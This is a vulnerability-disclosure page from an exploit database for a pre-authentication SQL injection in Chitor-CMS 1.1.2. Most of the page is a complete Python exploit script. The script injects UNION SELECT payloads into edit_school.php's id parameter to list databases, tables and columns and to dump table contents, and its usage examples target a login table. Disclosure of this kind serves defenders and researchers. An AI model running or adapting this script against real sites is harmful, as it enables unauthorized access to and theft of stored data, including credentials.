---
title: Chitor-CMS 1.1.2 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023040069
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:30.537861
---

# Chitor-CMS 1.1.2 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Chitor-CMS 1.1.2 SQL Injection** **2023.04.21**  Credit:  **[msd0pe](https://cxsecurity.com/author/msd0pe/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

#!/usr/bin/python3
#######################################################
# #
# Exploit Title: Chitor-CMS v1.1.2 - Pre-Auth SQL Injection #
# Date: 2023/04/13 #
# ExploitAuthor: msd0pe #
# Project: https://github.com/waqaskanju/Chitor-CMS #
# My Github: https://github.com/msd0pe-1 #
# Patched the 2023/04/16: 69d3442 commit #
# #
#######################################################
\_\_description\_\_ = 'Chitor-CMS < 1.1.2 Pre-Auth SQL Injection.'
\_\_author\_\_ = 'msd0pe'
\_\_version\_\_ = '1.1'
\_\_date\_\_ = '2023/04/13'
class bcolors:
PURPLE = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
OCRA = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
class infos:
INFO = "[" + bcolors.OCRA + bcolors.BOLD + "?" + bcolors.ENDC + bcolors.ENDC + "] "
ERROR = "[" + bcolors.RED + bcolors.BOLD + "X" + bcolors.ENDC + bcolors.ENDC + "] "
GOOD = "[" + bcolors.GREEN + bcolors.BOLD + "+" + bcolors.ENDC + bcolors.ENDC + "] "
PROCESS = "[" + bcolors.BLUE + bcolors.BOLD + "\*" + bcolors.ENDC + bcolors.ENDC + "] "
import re
import requests
import optparse
from prettytable import PrettyTable
def DumpTable(url, database, table):
header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
x = PrettyTable()
columns = []
payload = "/edit\_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON\_ARRAYAGG(CONCAT\_WS(0x787a6d64706c%2Ccolumn\_name))%2C0x716a6b6271) FROM INFORMATION\_SCHEMA.COLUMNS WHERE table\_name=\"" + table + "\" AND table\_schema=\"" + database + "\"-- -"
u = requests.get(url + payload, headers=header)
try:
r = re.findall("qpzkq\[(.\*?)\]qjkbq",u.text)
r = r[0].replace('\"',"").split(',')
if r == []:
pass
else:
for i in r:
columns.append(i)
pass
except:
pass
x.field\_names = columns
payload = "/edit\_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON\_ARRAYAGG(CONCAT\_WS(0x787a6d64706c%2C " + str(columns).replace("[","").replace("]","").replace("\'","").replace(" ","") + "))%2C0x716a6b6271) FROM " + database + "." + table + "-- -"
u = requests.get(url + payload, headers=header)
try:
r = re.findall("qpzkq\[(.\*?)\]qjkbq",u.text)
r = r[0].replace('\"',"").split(',')
if r == []:
pass
else:
for i in r:
i = i.split("xzmdpl")
x.add\_rows([i])
except ValueError:
r = re.findall("qpzkq\[(.\*?)\]qjkbq",u.text)
r = r[0].replace('\"',"").split(',')
if r == []:
pass
else:
for i in r:
i = i.split("xzmdpl")
i.append("")
x.add\_rows([i])
print(x)
def ListTables(url, database):
header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
x = PrettyTable()
x.field\_names = ["TABLES"]
payload = "/edit\_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON\_ARRAYAGG(CONCAT\_WS(0x787a6d64706c%2Ctable\_name))%2C0x716a6b6271) FROM INFORMATION\_SCHEMA.TABLES WHERE table\_schema IN (0x" + str(database).encode('utf-8').hex() + ")-- -"
u = requests.get(url + payload, headers=header)
try:
r = re.findall("qpzkq\[(.\*?)\]qjkbq",u.text)
r = r[0].replace('\"',"").split(',')
if r == []:
pass
else:
for i in r:
x.add\_row([i])
except:
pass
print(x)
def ListDatabases(url):
header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
x = PrettyTable()
x.field\_names = ["DATABASES"]
payload = "/edit\_school.php?id=-2164' UNION ALL SELECT NULL%2CNULL%2CCONCAT(0x71707a6b71%2CJSON\_ARRAYAGG(CONCAT\_WS(0x787a6d64706c%2Cschema\_name))%2C0x716a6b6271) FROM INFORMATION\_SCHEMA.SCHEMATA-- -"
u = requests.get(url + payload, headers=header)
try:
r = re.findall("qpzkq\[(.\*?)\]qjkbq",u.text)
r = r[0].replace('\"',"").split(',')
if r == []:
pass
else:
for i in r:
x.add\_row([i])
except:
pass
print(x)
def Main():
Menu = optparse.OptionParser(usage='python %prog [options]', version='%prog ' + \_\_version\_\_)
Menu.add\_option('-u', '--url', type="str", dest="url", help='target url')
Menu.add\_option('--dbs', action="store\_true", dest="l\_databases", help='list databases')
Menu.add\_option('-D', '--db', type="str", dest="database", help='select a database')
Menu.add\_option('--tables', action="store\_true", dest="l\_tables", help='list tables')
Menu.add\_option('-T', '--table', type="str", dest="table", help='select a table')
Menu.add\_option('--dump', action="store\_true", dest="dump", help='dump the content')
(options, args) = Menu.parse\_args()
Examples = optparse.OptionGroup(Menu, "Examples", """python3 chitor1.1.py -u http://127.0.0.1 --dbs
python3 chitor1.1.py -u http://127.0.0.1 -D chitor\_db --tables
python3 chitor1.1.py -u http://127.0.0.1 -D chitor\_db -T login --dump
""")
Menu.add\_option\_group(Examples)
if len(args) != 0 or options == {'url': None, 'l\_databases': None, 'database': None, 'l\_tables': None, 'table': None, 'dump': None}:
Menu.print\_help()
print('')
print(' %s' % \_\_description\_\_)
print(' Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
print(' Any malicious or illegal activity may be punishable by law')
print(' Use at your own risk')
elif len(args) == 0:
try:
if options.url != None:
if options.l\_databases != None:
ListDatabases(options.url)
if options.database != None:
if options.l\_tables != None:
ListTables(options.url, options.database)
if options.table != None:
if options.dump != None:
DumpTable(options.url, options.database, options.table)
except:
print("Unexpected error")
if \_\_name\_\_ == '\_\_main\_\_':
try:
Main()
except KeyboardInterrupt:
print()
print(infos.PROCESS + "Exiting...")
print()
exit(1)

[**See this note in RAW Version**](https://cxsecurity.com/asci...